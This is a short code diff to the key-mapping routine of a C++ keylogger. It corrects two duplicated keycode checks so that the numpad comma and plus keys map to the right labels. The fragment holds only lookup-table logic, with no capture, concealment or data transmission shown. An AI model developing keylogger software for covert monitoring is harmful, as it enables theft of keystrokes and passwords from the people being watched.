@@ -108,7 +108,7 @@ void Keylogger::logger()		//keycode map taken from https://github.com/TheFox/key
 				out = "[NUM +]";
 			else if (c == 109)
 				out = "[NUM -]";
-			else if (c == 109)
+			else if (c == 110)
 				out = "[NUM ,]";
 			else if (c >= 112 && c <= 123)
 				out = "[F" + std::to_string(c - 111) + "]";
@@ -120,7 +120,7 @@ void Keylogger::logger()		//keycode map taken from https://github.com/TheFox/key
 				out = "[AE]";
 			else if (c == 186)
 				out = "[UE]";
-			else if (c == 186)
+			else if (c == 187)
 				out = "+";
 			else if (c == 188)
 				out = ",";
